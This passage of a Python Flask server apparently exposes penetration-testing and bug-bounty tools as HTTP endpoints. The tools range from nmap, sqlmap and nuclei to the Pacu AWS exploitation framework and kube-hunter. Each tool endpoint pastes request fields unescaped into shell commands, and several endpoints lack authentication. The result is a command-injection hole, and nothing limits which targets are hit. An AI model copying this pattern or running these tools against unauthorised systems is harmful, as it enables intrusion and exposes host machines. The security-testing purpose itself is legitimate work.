                        "error": f"Tool {tool_name} not implemented in execution map",
                        "success": False
                    }

            except Exception as e:
                logger.error(f"❌ Error executing {tool_name}: {str(e)}")
                return {
                    "tool": tool_name,
                    "status": "failed",
                    "timestamp": datetime.now().isoformat(),
                    "error": str(e),
                    "success": False
                }

        # Execute tools in parallel using ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=min(len(selected_tools), 5)) as executor:
            # Submit all tool executions
            future_to_tool = {
                executor.submit(execute_single_tool, tool, target, profile): tool
                for tool in selected_tools
            }

            # Collect results as they complete
            for future in future_to_tool:
                tool_result = future.result()
                scan_results["tools_executed"].append(tool_result)

                # Accumulate vulnerability count
                if tool_result.get("vulnerabilities_found"):
                    scan_results["total_vulnerabilities"] += tool_result["vulnerabilities_found"]

                # Combine outputs
                if tool_result.get("stdout"):
                    scan_results["combined_output"] += f"\n=== {tool_result['tool'].upper()} OUTPUT ===\n"
                    scan_results["combined_output"] += tool_result["stdout"]
                    scan_results["combined_output"] += "\n" + "="*50 + "\n"

        # Create execution summary
        successful_tools = [t for t in scan_results["tools_executed"] if t.get("success")]
        failed_tools = [t for t in scan_results["tools_executed"] if not t.get("success")]

        scan_results["execution_summary"] = {
            "total_tools": len(selected_tools),
            "successful_tools": len(successful_tools),
            "failed_tools": len(failed_tools),
            "success_rate": len(successful_tools) / len(selected_tools) * 100 if selected_tools else 0,
            "total_execution_time": sum(t.get("execution_time", 0) for t in scan_results["tools_executed"]),
            "tools_used": [t["tool"] for t in successful_tools]
        }

        logger.info(f"✅ Intelligent smart scan completed for {target}")
        logger.info(f"📊 Results: {len(successful_tools)}/{len(selected_tools)} tools successful, {scan_results['total_vulnerabilities']} vulnerabilities found")

        return jsonify({
            "success": True,
            "scan_results": scan_results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in intelligent smart scan: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}", "success": False}), 500

# Helper functions for intelligent smart scan tool execution
def execute_nmap_scan(target, params):
    """Execute nmap scan with optimized parameters"""
    try:
        scan_type = params.get('scan_type', '-sV')
        ports = params.get('ports', '')
        additional_args = params.get('additional_args', '')

        # Build nmap command
        cmd_parts = ['nmap', scan_type]
        if ports:
            cmd_parts.extend(['-p', ports])
        if additional_args:
            cmd_parts.extend(additional_args.split())
        cmd_parts.append(target)

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_gobuster_scan(target, params):
    """Execute gobuster scan with optimized parameters"""
    try:
        mode = params.get('mode', 'dir')
        wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
        additional_args = params.get('additional_args', '')

        cmd_parts = ['gobuster', mode, '-u', target, '-w', wordlist]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_nuclei_scan(target, params):
    """Execute nuclei scan with optimized parameters"""
    try:
        severity = params.get('severity', '')
        tags = params.get('tags', '')
        additional_args = params.get('additional_args', '')

        cmd_parts = ['nuclei', '-u', target]
        if severity:
            cmd_parts.extend(['-severity', severity])
        if tags:
            cmd_parts.extend(['-tags', tags])
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_nikto_scan(target, params):
    """Execute nikto scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['nikto', '-h', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_sqlmap_scan(target, params):
    """Execute sqlmap scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '--batch --random-agent')
        cmd_parts = ['sqlmap', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_ffuf_scan(target, params):
    """Execute ffuf scan with optimized parameters"""
    try:
        wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
        additional_args = params.get('additional_args', '')

        # Ensure target has FUZZ placeholder
        if 'FUZZ' not in target:
            target = target.rstrip('/') + '/FUZZ'

        cmd_parts = ['ffuf', '-u', target, '-w', wordlist]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_feroxbuster_scan(target, params):
    """Execute feroxbuster scan with optimized parameters"""
    try:
        wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
        additional_args = params.get('additional_args', '')

        cmd_parts = ['feroxbuster', '-u', target, '-w', wordlist]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_katana_scan(target, params):
    """Execute katana scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['katana', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_httpx_scan(target, params):
    """Execute httpx scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '-tech-detect -status-code')
        # Use shell command with pipe for httpx
        cmd = f"echo {target} | httpx {additional_args}"

        return execute_command(cmd)
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_wpscan_scan(target, params):
    """Execute wpscan scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '--enumerate p,t,u')
        cmd_parts = ['wpscan', '--url', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_dirsearch_scan(target, params):
    """Execute dirsearch scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['dirsearch', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_arjun_scan(target, params):
    """Execute arjun scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['arjun', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_paramspider_scan(target, params):
    """Execute paramspider scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['paramspider', '-d', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_dalfox_scan(target, params):
    """Execute dalfox scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['dalfox', 'url', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_amass_scan(target, params):
    """Execute amass scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['amass', 'enum', '-d', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_subfinder_scan(target, params):
    """Execute subfinder scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['subfinder', '-d', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.route("/api/intelligence/technology-detection", methods=["POST"])
@require_api_key
def detect_technologies():
    """Detect technologies and create technology-specific testing recommendations"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']

        logger.info(f"🔍 Detecting technologies for {target}")

        # Analyze target
        profile = decision_engine.analyze_target(target)

        # Get technology-specific recommendations
        tech_recommendations = {}
        for tech in profile.technologies:
            if tech == TechnologyStack.WORDPRESS:
                tech_recommendations["WordPress"] = {
                    "tools": ["wpscan", "nuclei"],
                    "focus_areas": ["plugin vulnerabilities", "theme issues", "user enumeration"],
                    "priority": "high"
                }
            elif tech == TechnologyStack.PHP:
                tech_recommendations["PHP"] = {
                    "tools": ["nikto", "sqlmap", "ffuf"],
                    "focus_areas": ["code injection", "file inclusion", "SQL injection"],
                    "priority": "high"
                }
            elif tech == TechnologyStack.NODEJS:
                tech_recommendations["Node.js"] = {
                    "tools": ["nuclei", "ffuf"],
                    "focus_areas": ["prototype pollution", "dependency vulnerabilities"],
                    "priority": "medium"
                }

        logger.info(f"✅ Technology detection completed for {target}")

        return jsonify({
            "success": True,
            "target": target,
            "detected_technologies": [tech.value for tech in profile.technologies],
            "cms_type": profile.cms_type,
            "technology_recommendations": tech_recommendations,
            "target_profile": profile.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in technology detection: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# BUG BOUNTY HUNTING WORKFLOW API ENDPOINTS
# ============================================================================

@app.route("/api/bugbounty/reconnaissance-workflow", methods=["POST"])
@require_api_key
def create_reconnaissance_workflow():
    """Create comprehensive reconnaissance workflow for bug bounty hunting"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        scope = data.get('scope', [])
        out_of_scope = data.get('out_of_scope', [])
        program_type = data.get('program_type', 'web')

        logger.info(f"🎯 Creating reconnaissance workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(
            domain=domain,
            scope=scope,
            out_of_scope=out_of_scope,
            program_type=program_type
        )

        # Generate reconnaissance workflow
        workflow = bugbounty_manager.create_reconnaissance_workflow(target)

        logger.info(f"✅ Reconnaissance workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating reconnaissance workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/vulnerability-hunting-workflow", methods=["POST"])
@require_api_key
def create_vulnerability_hunting_workflow():
    """Create vulnerability hunting workflow prioritized by impact"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        priority_vulns = data.get('priority_vulns', ["rce", "sqli", "xss", "idor", "ssrf"])
        bounty_range = data.get('bounty_range', 'unknown')

        logger.info(f"🎯 Creating vulnerability hunting workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(
            domain=domain,
            priority_vulns=priority_vulns,
            bounty_range=bounty_range
        )

        # Generate vulnerability hunting workflow
        workflow = bugbounty_manager.create_vulnerability_hunting_workflow(target)

        logger.info(f"✅ Vulnerability hunting workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating vulnerability hunting workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/business-logic-workflow", methods=["POST"])
@require_api_key
def create_business_logic_workflow():
    """Create business logic testing workflow"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        program_type = data.get('program_type', 'web')

        logger.info(f"🎯 Creating business logic testing workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(domain=domain, program_type=program_type)

        # Generate business logic testing workflow
        workflow = bugbounty_manager.create_business_logic_testing_workflow(target)

        logger.info(f"✅ Business logic testing workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating business logic workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/osint-workflow", methods=["POST"])
@require_api_key
def create_osint_workflow():
    """Create OSINT gathering workflow"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']

        logger.info(f"🎯 Creating OSINT workflow for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(domain=domain)

        # Generate OSINT workflow
        workflow = bugbounty_manager.create_osint_workflow(target)

        logger.info(f"✅ OSINT workflow created for {domain}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating OSINT workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/file-upload-testing", methods=["POST"])
@require_api_key
def create_file_upload_testing():
    """Create file upload vulnerability testing workflow"""
    try:
        data = request.get_json()
        if not data or 'target_url' not in data:
            return jsonify({"error": "Target URL is required"}), 400

        target_url = data['target_url']

        logger.info(f"🎯 Creating file upload testing workflow for {target_url}")

        # Generate file upload testing workflow
        workflow = fileupload_framework.create_upload_testing_workflow(target_url)

        # Generate test files
        test_files = fileupload_framework.generate_test_files()
        workflow["test_files"] = test_files

        logger.info(f"✅ File upload testing workflow created for {target_url}")

        return jsonify({
            "success": True,
            "workflow": workflow,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating file upload testing workflow: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/bugbounty/comprehensive-assessment", methods=["POST"])
@require_api_key
def create_comprehensive_bugbounty_assessment():
    """Create comprehensive bug bounty assessment combining all workflows"""
    try:
        data = request.get_json()
        if not data or 'domain' not in data:
            return jsonify({"error": "Domain is required"}), 400

        domain = data['domain']
        scope = data.get('scope', [])
        priority_vulns = data.get('priority_vulns', ["rce", "sqli", "xss", "idor", "ssrf"])
        include_osint = data.get('include_osint', True)
        include_business_logic = data.get('include_business_logic', True)

        logger.info(f"🎯 Creating comprehensive bug bounty assessment for {domain}")

        # Create bug bounty target
        target = BugBountyTarget(
            domain=domain,
            scope=scope,
            priority_vulns=priority_vulns
        )

        # Generate all workflows
        assessment = {
            "target": domain,
            "reconnaissance": bugbounty_manager.create_reconnaissance_workflow(target),
            "vulnerability_hunting": bugbounty_manager.create_vulnerability_hunting_workflow(target)
        }

        if include_osint:
            assessment["osint"] = bugbounty_manager.create_osint_workflow(target)

        if include_business_logic:
            assessment["business_logic"] = bugbounty_manager.create_business_logic_testing_workflow(target)

        # Calculate total estimates
        total_time = sum(workflow.get("estimated_time", 0) for workflow in assessment.values() if isinstance(workflow, dict))
        total_tools = sum(workflow.get("tools_count", 0) for workflow in assessment.values() if isinstance(workflow, dict))

        assessment["summary"] = {
            "total_estimated_time": total_time,
            "total_tools": total_tools,
            "workflow_count": len([k for k in assessment.keys() if k != "target"]),
            "priority_score": assessment["vulnerability_hunting"].get("priority_score", 0)
        }

        logger.info(f"✅ Comprehensive bug bounty assessment created for {domain}")

        return jsonify({
            "success": True,
            "assessment": assessment,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating comprehensive assessment: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# SECURITY TOOLS API ENDPOINTS
# ============================================================================

@app.route("/api/tools/nmap", methods=["POST"])
def nmap():
    """Execute nmap scan with enhanced logging, caching, and intelligent error handling"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "-sCV")
        ports = params.get("ports", "")
        additional_args = params.get("additional_args", "-T4 -Pn")
        use_recovery = params.get("use_recovery", True)

        if not target:
            logger.warning("🎯 Nmap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nmap {scan_type}"

        if ports:
            command += f" -p {ports}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {target}"

        logger.info(f"🔍 Starting Nmap scan: {target}")

        # Use intelligent error handling if enabled
        if use_recovery:
            tool_params = {
                "target": target,
                "scan_type": scan_type,
                "ports": ports,
                "additional_args": additional_args
            }
            result = execute_command_with_recovery("nmap", command, tool_params)
        else:
            result = execute_command(command)

        logger.info(f"📊 Nmap scan completed for {target}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in nmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/gobuster", methods=["POST"])
def gobuster():
    """Execute gobuster with enhanced logging and intelligent error handling"""
    try:
        params = request.json
        url = params.get("url", "")
        mode = params.get("mode", "dir")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")
        use_recovery = params.get("use_recovery", True)

        if not url:
            logger.warning("🌐 Gobuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        # Validate mode
        if mode not in ["dir", "dns", "fuzz", "vhost"]:
            logger.warning(f"❌ Invalid gobuster mode: {mode}")
            return jsonify({
                "error": f"Invalid mode: {mode}. Must be one of: dir, dns, fuzz, vhost"
            }), 400

        command = f"gobuster {mode} -u {url} -w {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📁 Starting Gobuster {mode} scan: {url}")

        # Use intelligent error handling if enabled
        if use_recovery:
            tool_params = {
                "target": url,
                "mode": mode,
                "wordlist": wordlist,
                "additional_args": additional_args
            }
            result = execute_command_with_recovery("gobuster", command, tool_params)
        else:
            result = execute_command(command)

        logger.info(f"📊 Gobuster scan completed for {url}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in gobuster endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/nuclei", methods=["POST"])
def nuclei():
    """Execute Nuclei vulnerability scanner with enhanced logging and intelligent error handling"""
    try:
        params = request.json
        target = params.get("target", "")
        severity = params.get("severity", "")
        tags = params.get("tags", "")
        template = params.get("template", "")
        additional_args = params.get("additional_args", "")
        use_recovery = params.get("use_recovery", True)

        if not target:
            logger.warning("🎯 Nuclei called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"nuclei -u {target}"

        if severity:
            command += f" -severity {severity}"

        if tags:
            command += f" -tags {tags}"

        if template:
            command += f" -t {template}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔬 Starting Nuclei vulnerability scan: {target}")

        # Use intelligent error handling if enabled
        if use_recovery:
            tool_params = {
                "target": target,
                "severity": severity,
                "tags": tags,
                "template": template,
                "additional_args": additional_args
            }
            result = execute_command_with_recovery("nuclei", command, tool_params)
        else:
            result = execute_command(command)

        logger.info(f"📊 Nuclei scan completed for {target}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in nuclei endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# NUCLEI TEMPLATE AUTO-UPDATE (v7.0)
# ============================================================================

# Track last update time so we can decide whether to update on startup
_NUCLEI_LAST_UPDATE_FILE = Path.home() / ".hexstrike" / "nuclei_last_update.txt"
_NUCLEI_UPDATE_INTERVAL_HOURS = 24  # update at most once per day


def _nuclei_should_update() -> bool:
    """Return True if templates haven't been updated in the last 24 hours."""
    if not _NUCLEI_LAST_UPDATE_FILE.exists():
        return True
    try:
        last = datetime.fromisoformat(_NUCLEI_LAST_UPDATE_FILE.read_text().strip())
        return (datetime.now() - last).total_seconds() > _NUCLEI_UPDATE_INTERVAL_HOURS * 3600
    except Exception:
        return True


def _nuclei_record_update():
    """Write current timestamp to the last-update file."""
    try:
        _NUCLEI_LAST_UPDATE_FILE.parent.mkdir(parents=True, exist_ok=True)
        _NUCLEI_LAST_UPDATE_FILE.write_text(datetime.now().isoformat())
    except Exception as exc:
        logger.warning(f"Could not write nuclei update timestamp: {exc}")


@app.route("/api/tools/nuclei-update", methods=["POST"])
@require_api_key
def nuclei_update_templates():
    """
    Update nuclei templates via `nuclei -update-templates`.

    By default, only runs if templates haven't been updated in the last 24 hours
    (set force=true to bypass this check).

    Returns:
      - updated: bool — whether an update was actually run
      - skipped: bool — whether update was skipped (already up to date)
      - stdout/stderr: nuclei output
      - last_update: ISO timestamp of when templates were last updated
    """
    try:
        params = request.json or {}
        force = params.get("force", False)

        if not force and not _nuclei_should_update():
            last = _NUCLEI_LAST_UPDATE_FILE.read_text().strip()
            logger.info(f"⏭️  Nuclei templates already up to date (last: {last})")
            return jsonify({
                "success": True,
                "updated": False,
                "skipped": True,
                "reason": f"Templates updated less than {_NUCLEI_UPDATE_INTERVAL_HOURS}h ago",
                "last_update": last
            })

        logger.info("🔄 Updating nuclei templates...")
        result = execute_command_with_recovery("nuclei", "nuclei -update-templates", params)

        if result.get("success") or "updated" in result.get("stdout", "").lower():
            _nuclei_record_update()
            last = _NUCLEI_LAST_UPDATE_FILE.read_text().strip() if _NUCLEI_LAST_UPDATE_FILE.exists() else ""
            logger.info("✅ Nuclei templates updated successfully")
            result["updated"] = True
            result["skipped"] = False
            result["last_update"] = last
        else:
            logger.warning("⚠️  Nuclei template update may have failed — check stderr")
            result["updated"] = False
            result["skipped"] = False

        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Nuclei update error: {str(e)}")
        return jsonify({"error": str(e), "success": False}), 500


# Auto-update templates on startup (non-blocking, best-effort)
def _nuclei_auto_update_on_startup():
    """Run nuclei template update in background on server startup if overdue."""
    try:
        if not _nuclei_should_update():
            logger.info("⏭️  Nuclei templates fresh — skipping startup update")
            return
        logger.info("🔄 [startup] Updating nuclei templates in background...")
        import subprocess
        proc = subprocess.run(
            ["nuclei", "-update-templates"],
            capture_output=True, text=True, timeout=120
        )
        if proc.returncode == 0 or "updated" in proc.stdout.lower():
            _nuclei_record_update()
            logger.info("✅ [startup] Nuclei templates updated")
        else:
            logger.warning(f"⚠️  [startup] Nuclei template update failed: {proc.stderr[:200]}")
    except Exception as exc:
        logger.debug(f"[startup] Nuclei update skipped: {exc}")


# ============================================================================
# CLOUD SECURITY TOOLS
# ============================================================================

@app.route("/api/tools/prowler", methods=["POST"])
def prowler():
    """Execute Prowler for AWS security assessment"""
    try:
        params = request.json
        provider = params.get("provider", "aws")
        profile = params.get("profile", "default")
        region = params.get("region", "")
        checks = params.get("checks", "")
        output_dir = params.get("output_dir", "/tmp/prowler_output")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        # Ensure output directory exists
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        command = f"prowler {provider}"

        if profile:
            command += f" --profile {profile}"

        if region:
            command += f" --region {region}"

        if checks:
            command += f" --checks {checks}"

        command += f" --output-directory {output_dir}"
        command += f" --output-format {output_format}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting Prowler {provider} security assessment")
        result = execute_command(command)
        result["output_directory"] = output_dir
        logger.info(f"📊 Prowler assessment completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in prowler endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/trivy", methods=["POST"])
def trivy():
    """Execute Trivy for container/filesystem vulnerability scanning"""
    try:
        params = request.json
        scan_type = params.get("scan_type", "image")  # image, fs, repo
        target = params.get("target", "")
        output_format = params.get("output_format", "json")
        severity = params.get("severity", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 Trivy called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"trivy {scan_type} {target}"

        if output_format:
            command += f" --format {output_format}"

        if severity:
            command += f" --severity {severity}"

        if output_file:
            command += f" --output {output_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Trivy {scan_type} scan: {target}")
        result = execute_command(command)
        if output_file:
            result["output_file"] = output_file
        logger.info(f"📊 Trivy scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in trivy endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED CLOUD AND CONTAINER SECURITY TOOLS (v6.0)
# ============================================================================

@app.route("/api/tools/scout-suite", methods=["POST"])
def scout_suite():
    """Execute Scout Suite for multi-cloud security assessment"""
    try:
        params = request.json
        provider = params.get("provider", "aws")  # aws, azure, gcp, aliyun, oci
        profile = params.get("profile", "default")
        report_dir = params.get("report_dir", "/tmp/scout-suite")
        services = params.get("services", "")
        exceptions = params.get("exceptions", "")
        additional_args = params.get("additional_args", "")

        # Ensure report directory exists
        Path(report_dir).mkdir(parents=True, exist_ok=True)

        command = f"scout {provider}"

        if profile and provider == "aws":
            command += f" --profile {profile}"

        if services:
            command += f" --services {services}"

        if exceptions:
            command += f" --exceptions {exceptions}"

        command += f" --report-dir {report_dir}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting Scout Suite {provider} assessment")
        result = execute_command(command)
        result["report_directory"] = report_dir
        logger.info(f"📊 Scout Suite assessment completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in scout-suite endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/cloudmapper", methods=["POST"])
def cloudmapper():
    """Execute CloudMapper for AWS network visualization and security analysis"""
    try:
        params = request.json
        action = params.get("action", "collect")  # collect, prepare, webserver, find_admins, etc.
        account = params.get("account", "")
        config = params.get("config", "config.json")
        additional_args = params.get("additional_args", "")

        if not account and action != "webserver":
            logger.warning("☁️  CloudMapper called without account parameter")
            return jsonify({"error": "Account parameter is required for most actions"}), 400

        command = f"cloudmapper {action}"

        if account:
            command += f" --account {account}"

        if config:
            command += f" --config {config}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting CloudMapper {action}")
        result = execute_command(command)
        logger.info(f"📊 CloudMapper {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in cloudmapper endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pacu", methods=["POST"])
def pacu():
    """Execute Pacu for AWS exploitation framework"""
    try:
        params = request.json
        session_name = params.get("session_name", "hexstrike_session")
        modules = params.get("modules", "")
        data_services = params.get("data_services", "")
        regions = params.get("regions", "")
        additional_args = params.get("additional_args", "")

        # Create Pacu command sequence
        commands = []
        commands.append(f"set_session {session_name}")

        if data_services:
            commands.append(f"data {data_services}")

        if regions:
            commands.append(f"set_regions {regions}")

        if modules:
            for module in modules.split(","):
                commands.append(f"run {module.strip()}")

        commands.append("exit")

        # Create command file
        command_file = "/tmp/pacu_commands.txt"
        with open(command_file, "w") as f:
            f.write("\n".join(commands))

        command = f"pacu < {command_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting Pacu AWS exploitation")
        result = execute_command(command)

        # Cleanup
        try:
            os.remove(command_file)
        except:
            pass

        logger.info(f"📊 Pacu exploitation completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in pacu endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/kube-hunter", methods=["POST"])
def kube_hunter():
    """Execute kube-hunter for Kubernetes penetration testing"""
    try:
        params = request.json
        target = params.get("target", "")
        remote = params.get("remote", "")
        cidr = params.get("cidr", "")
        interface = params.get("interface", "")
        active = params.get("active", False)
        report = params.get("report", "json")
        additional_args = params.get("additional_args", "")

        command = "kube-hunter"

        if target:
            command += f" --remote {target}"
        elif remote:
            command += f" --remote {remote}"
        elif cidr:
            command += f" --cidr {cidr}"
        elif interface:
            command += f" --interface {interface}"
        else:
            # Default to pod scanning
            command += " --pod"

        if active:
            command += " --active"

        if report:
            command += f" --report {report}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting kube-hunter Kubernetes scan")
        result = execute_command(command)
        logger.info(f"📊 kube-hunter scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in kube-hunter endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/kube-bench", methods=["POST"])
def kube_bench():
    """Execute kube-bench for CIS Kubernetes benchmark checks"""
    try:
        params = request.json
        targets = params.get("targets", "")  # master, node, etcd, policies
        version = params.get("version", "")
        config_dir = params.get("config_dir", "")
        output_format = params.get("output_format", "json")
        additional_args = params.get("additional_args", "")

        command = "kube-bench"

        if targets:
            command += f" --targets {targets}"

        if version:
            command += f" --version {version}"

        if config_dir:
            command += f" --config-dir {config_dir}"

        if output_format:
            command += f" --outputfile /tmp/kube-bench-results.{output_format} --json"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"☁️  Starting kube-bench CIS benchmark")
        result = execute_command(command)
        logger.info(f"📊 kube-bench benchmark completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in kube-bench endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/docker-bench-security", methods=["POST"])
def docker_bench_security():
    """Execute Docker Bench for Security for Docker security assessment"""
    try:
        params = request.json
        checks = params.get("checks", "")  # Specific checks to run
        exclude = params.get("exclude", "")  # Checks to exclude
        output_file = params.get("output_file", "/tmp/docker-bench-results.json")
        additional_args = params.get("additional_args", "")

        command = "docker-bench-security"

        if checks:
            command += f" -c {checks}"

        if exclude:
            command += f" -e {exclude}"

        if output_file:
            command += f" -l {output_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🐳 Starting Docker Bench Security assessment")
        result = execute_command(command)
        result["output_file"] = output_file
        logger.info(f"📊 Docker Bench Security completed")
        return jsonify(result)
    except Exception as e:
